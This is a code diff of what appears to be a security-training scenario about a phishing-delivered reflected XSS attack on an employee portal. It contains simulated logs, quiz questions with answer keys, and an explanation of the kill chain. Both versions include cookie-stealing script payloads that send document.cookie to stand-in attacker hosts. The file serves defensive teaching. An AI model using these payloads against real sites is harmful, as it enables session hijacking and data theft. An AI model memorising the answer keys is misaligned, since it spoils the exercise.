@@ -4,80 +4,79 @@ scenarios.push({
     description: "Suspicious script payloads detected in search-query parameters of the internal employee portal, followed by unauthorized session activity.",
     logs: {
         proxy: [
-            "2026-05-29T10:45:12Z - IP: 192.168.10.14 - URL: https://github.com/company-org - Action: Allowed - Bytes: 15320",
-            "2026-05-29T11:00:15Z - IP: 192.168.10.12 - URL: https://portal.example.com/search?q=benefits - Action: Allowed - Status: 200 - Bytes: 4500",
-            "2026-05-29T11:02:30Z - IP: 192.168.10.33 - URL: https://portal.example.com/dashboard - Action: Allowed - Status: 200 - Bytes: 1240",
-            "2026-05-29T11:05:40Z - IP: 192.168.10.88 - URL: https://portal.example.com/search?q=<script>fetch('https://attacker.example.top/steal?c='+document.cookie)</script> - Action: Allowed - Status: 200 - Bytes: 4200",
-            "2026-05-29T11:08:22Z - IP: 192.168.10.12 - URL: https://portal.example.com/search?q=<script>fetch('https://attacker.example.top/steal?c='+document.cookie)</script> - Action: Allowed - Status: 200 - Bytes: 4200",
-            "2026-05-29T11:10:05Z - IP: 192.168.10.15 - URL: https://www.google.com/search?q=weather - Action: Allowed - Bytes: 1200",
-            "2026-05-29T11:12:15Z - IP: 192.168.10.33 - URL: https://portal.example.com/search?q=401k+plans - Action: Allowed - Status: 200 - Bytes: 4600",
-            "2026-05-29T11:15:00Z - IP: 192.168.10.12 - URL: https://attacker.example.top/steal?c=sessionid=ABC123XYZ - Action: Allowed - Status: 200 - Bytes: 45",
-            "2026-05-29T11:18:45Z - IP: 192.168.10.10 - URL: https://slack.com/api/rtm.start - Action: Allowed - Bytes: 3100",
-            "2026-05-29T11:20:00Z - IP: 203.0.113.10 - URL: https://portal.example.com/admin/user_mgmt - Action: Allowed - Status: 200 - Cookie: sessionid=ABC123XYZ - Bytes: 12500",
-            "2026-05-29T11:22:15Z - IP: 203.0.113.10 - URL: https://portal.example.com/admin/export_users - Action: Allowed - Status: 200 - Cookie: sessionid=ABC123XYZ - Bytes: 450000",
-            "2026-05-29T11:25:12Z - IP: 192.168.10.12 - URL: https://portal.example.com/logout - Action: Allowed - Status: 200 - Bytes: 450",
-            "2026-05-29T11:30:00Z - IP: 192.168.10.45 - URL: https://portal.example.com/search?q=company+holidays - Action: Allowed - Status: 200 - Bytes: 4300"
+            "2026-06-01T08:15:20Z - IP: 192.168.10.10 - URL: https://portal.company.local/search?q=benefits - Action: Allowed - Category: Internal Portal - Status: 200 - Bytes: 12500",
+            "2026-06-01T08:22:45Z - IP: 192.168.10.14 - URL: https://github.com/company-org/frontend - Action: Allowed - Category: IT/Development - Status: 200 - Bytes: 45200",
+            "2026-06-01T08:35:10Z - IP: 192.168.10.88 - URL: https://portal.company.local/search?q=holiday_schedule - Action: Allowed - Category: Internal Portal - Status: 200 - Bytes: 11200",
+            "2026-06-01T08:50:10Z - IP: 192.168.10.33 - URL: https://portal.company.local/search?q=%3Cscript%3Enew%20Image().src='http://evil-c2.top/log?c='%2Bdocument.cookie;%3C/script%3E - Action: Allowed - Category: Internal Portal - Status: 200 - Bytes: 14500",
+            "2026-06-01T08:50:11Z - IP: 192.168.10.33 - URL: http://evil-c2.top/log?c=session_id=A9F3B211X_HR_ADMIN - Action: Allowed - Category: Uncategorized - Status: 200 - Bytes: 43",
+            "2026-06-01T08:55:00Z - IP: 192.168.10.10 - URL: https://slack.com/api/rtm.start - Action: Allowed - Category: Business/Collaboration - Status: 200 - Bytes: 3100",
+            "2026-06-01T09:05:00Z - IP: 203.0.113.88 - URL: https://portal.company.local/api/hr/employee_pii_export - Action: Allowed - Category: Internal Portal - Status: 200 - Cookie: session_id=A9F3B211X_HR_ADMIN - Bytes: 4500000",
+            "2026-06-01T09:12:15Z - IP: 192.168.10.88 - URL: https://portal.company.local/dashboard - Action: Allowed - Category: Internal Portal - Status: 200 - Bytes: 24000"
         ],
         email: [
-            "2026-05-29T10:40:00Z - Inbound - From: notifications@slack.com - To: asmith@example.com - Subject: You have unread messages - Status: Delivered",
-            "2026-05-29T10:55:00Z - Inbound - From: hr-internal@portal-update.example.com - To: fsmith@example.com - Subject: Action Required: Review New Benefits Search Feature - Link: https://portal.example.com/search?q=<script>...</script> - Status: Delivered",
-            "2026-05-29T11:05:12Z - Inbound - From: newsletters@techcrunch.com - To: asmith@example.com - Subject: TechCrunch Daily - Status: Delivered",
-            "2026-05-29T11:15:30Z - Inbound - From: internal-it@example.com - To: employee-all@example.com - Subject: Security Awareness Training Reminder - Status: Delivered",
-            "2026-05-29T11:30:00Z - Outbound - From: mrogers@example.com - To: candidates@jobmail.com - Subject: Interview Schedule - Status: Sent"
+            "2026-06-01T08:00:10Z - Inbound - From: notifications@slack.com - To: mrogers@company.com - Subject: Daily Team Sync - Status: Delivered",
+            "2026-06-01T08:30:15Z - Inbound - From: alerts@bamboohr.com - To: asmith@company.com - Subject: Timesheet Approved - Status: Delivered",
+            "2026-06-01T08:45:10Z - Inbound - From: portal-admin@company-updates-local.com - To: mrogers@company.com - Subject: URGENT: Review Pending Employee Profile Discrepancies - Status: Delivered",
+            "2026-06-01T09:10:00Z - Inbound - From: newsletter@techtrends.com - To: jdoe@company.com - Subject: Weekly Technology Brief - Status: Delivered"
         ],
         file_server: [
-            "2026-05-29T10:30:15Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
-            "2026-05-29T11:22:00Z - Share Name: \\\\FILE-SRV-01\\HR - Access Request: Allowed - Source IP: 203.0.113.10 - User: COMPANY\\fsmith (via Web Session)",
-            "2026-05-29T11:45:11Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.15 - User: COMPANY\\mrogers"
+            "2026-06-01T08:20:15Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
+            "2026-06-01T08:21:05Z - Object Accessed: \\\\FILE-SRV-01\\Public\\Templates\\Onboarding_Guide.pdf - Accesses: ReadData - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
+            "2026-06-01T09:15:20Z - Share Name: \\\\FILE-SRV-01\\DevShare - Access Request: Allowed - Source IP: 192.168.10.14 - User: COMPANY\\rjones"
         ],
         workstations: [
-            "2026-05-29T09:01:22Z - WKSTN-01 (192.168.10.10) - EventID: 4688 - Process Created: explorer.exe spawned slack.exe",
-            "2026-05-29T11:08:22Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: chrome.exe spawned - URL: https://portal.example.com/search?q=...",
-            "2026-05-29T11:15:00Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: chrome.exe spawned - URL: https://attacker.example.top/steal?c=...",
-            "2026-05-29T11:30:12Z - WKSTN-01 (192.168.10.10) - EventID: 4800 - Workstation Locked - User: COMPANY\\asmith"
+            "2026-06-01T08:15:00Z - WKSTN-01 (192.168.10.10) - EventID: 4688 - Process Created: explorer.exe spawned chrome.exe",
+            "2026-06-01T08:35:05Z - WKSTN-08 (192.168.10.88) - EventID: 4688 - Process Created: explorer.exe spawned outlook.exe",
+            "2026-06-01T08:50:10Z - WKSTN-33 (192.168.10.33) - EventID: 4688 - Process Created: outlook.exe spawned chrome.exe --url https://portal.company.local/search?q=%3Cscript...",
+            "2026-06-01T09:00:15Z - WKSTN-33 (192.168.10.33) - EventID: 7036 - Service Status Change: Windows Update Service entered the running state.",
+            "2026-06-01T09:12:00Z - WKSTN-03 (192.168.10.14) - EventID: 4688 - Process Created: explorer.exe spawned vscode.exe"
         ],
         auth_logs: [
-            "2026-05-29T08:00:15Z - WKSTN-01 (192.168.10.10) - EventID: 4624 - Successful Logon - User: COMPANY\\asmith",
-            "2026-05-29T08:15:32Z - WKSTN-04 (192.168.10.45) - EventID: 4624 - Successful Logon - User: COMPANY\\jdoe",
-            "2026-05-29T11:00:00Z - Web_Auth - User: fsmith@example.com - App: Employee Portal - Status: Success - Source: 192.168.10.12",
-            "2026-05-29T11:20:00Z - Web_Auth - User: fsmith@example.com - App: Employee Portal - Status: Success - Source: 203.0.113.10 - Note: Session Token Reuse Detected"
+            "2026-06-01T08:00:15Z - WKSTN-01 (192.168.10.10) - EventID: 4624 - Successful Logon - User: COMPANY\\asmith - Logon Type: 2 (Interactive)",
+            "2026-06-01T08:05:00Z - IdP_Auth - User: mrogers@company.com - App: O365 Portal - AuthMethod: Password+MFA - Status: Success - IP: 192.168.10.33",
+            "2026-06-01T08:10:00Z - WKSTN-08 (192.168.10.88) - EventID: 4624 - Successful Logon - User: COMPANY\\jdoe - Logon Type: 2 (Interactive)",
+            "2026-06-01T09:05:00Z - Portal_Auth - User: mrogers@company.com - App: Internal HR Portal - AuthMethod: Session_Token - Status: Success - IP: 203.0.113.88 - Note: Anomalous external IP authenticating with active session token"
         ]
     },
     questions: {
         vector: {
-            label: "What type of vulnerability was exploited to steal the user's session?",
+            label: "What was the initial delivery vector used to execute the malicious payload?",
             type: "select",
             options: [
-                "Reflected Cross-Site Scripting (XSS)",
-                "Stored Cross-Site Scripting (XSS)",
-                "SQL Injection in the search bar",
-                "Phishing for plaintext credentials"
+                "An unauthenticated SQL injection exploit on the public web gateway",
+                "A spear-phishing email containing a crafted, malicious URL link",
+                "A malicious document attachment executing macros",
+                "A supply chain compromise of the portal's JavaScript libraries"
             ],
-            correct: "Reflected Cross-Site Scripting (XSS)"
+            correct: "A spear-phishing email containing a crafted, malicious URL link"
         },
-        delivery: {
-            label: "How was the malicious script payload delivered to the victim?",
+        hijack: {
+            label: "How did the attacker bypass authentication to access the sensitive /api/hr/employee_pii_export endpoint?",
             type: "select",
             options: [
-                "Embedded in a phishing email link",
-                "Uploaded as a malicious profile picture",
-                "Through a compromised third-party browser extension",
-                "Directly injected into the web server's database"
+                "By performing a Pass-the-Hash attack using stolen NTLM credentials",
+                "By brute-forcing the user's password over an exposed administrative interface",
+                "By leveraging stolen session cookies exfiltrated via a reflected XSS script",
+                "By executing an Insecure Direct Object Reference (IDOR) manipulation"
             ],
-            correct: "Embedded in a phishing email link"
+            correct: "By leveraging stolen session cookies exfiltrated via a reflected XSS script"
         },
         indicator: {
-            label: "What log entry confirms that the session theft was successful?",
+            label: "Which specific indicator confirms the execution of the Cross-Site Scripting (XSS) payload in the user's browser?",
             type: "select",
             options: [
-                "A 500 error on the search page",
-                "A 200 OK response for a request to attacker.example.top containing a session cookie",
-                "The creation of a new user account on WKSTN-02",
-                "An oversized ICMP ping from the employee portal"
+                "A subsequent outbound proxy request to evil-c2.top appending the document.cookie parameter",
+                "A massive 4.5MB data transfer from the HR API to an external IP",
+                "Outlook.exe spawning chrome.exe in the workstation process logs",
+                "An anomalous authentication event originating from IP 203.0.113.88"
             ],
-            correct: "A 200 OK response for a request to attacker.example.top containing a session cookie"
+            correct: "A subsequent outbound proxy request to evil-c2.top appending the document.cookie parameter"
         }
     },
-    principles: ["Cross-Site Scripting (XSS)", "Phishing / Social Engineering", "Unauthorized Privilege Use"],
-    explanation: "The incident began with a phishing email sent to user 'fsmith'. The email contained a link to the internal employee portal with a malicious JavaScript payload reflected in the 'q' search parameter. When fsmith clicked the link at 11:08:22Z, the script executed in their browser, fetching their session cookie and sending it to the attacker's external domain 'attacker.example.top'. The attacker then immediately used this stolen session token at 11:20:00Z from an external IP (203.0.113.10) to access the administrative areas of the portal and HR files. Benign activity includes other users legitimately using the search feature and IT-related communications."
+    principles: [
+        "Cross-Site Scripting (XSS)",
+        "Phishing / Social Engineering",
+        "Data Exfiltration (Overt Channel)"
+    ],
+    explanation: "At 08:45:10Z, user 'mrogers' received a spear-phishing email from a lookalike domain containing a malicious link. At 08:50:10Z, the user clicked the link, causing Outlook to spawn Chrome and navigate to the company's internal portal with a crafted URL parameter. Because the internal portal was vulnerable to Reflected Cross-Site Scripting (XSS), it rendered the injected <script> tag into the victim's browser. The malicious script instantly executed, grabbing the victim's active session cookie (session_id=A9F3B211X_HR_ADMIN) and forwarding it to the attacker's drop server at evil-c2.top. At 09:05:00Z, the attacker (IP 203.0.113.88) used this stolen session token to hijack the victim's identity and authenticate to the portal without needing a password or MFA. The attacker then executed a 4.5MB overt exfiltration of employee PII data. This demonstrates a complete kill chain moving from Social Engineering, to Client-Side Execution (XSS), to Session Hijacking, and finally Data Exfiltration."
 });
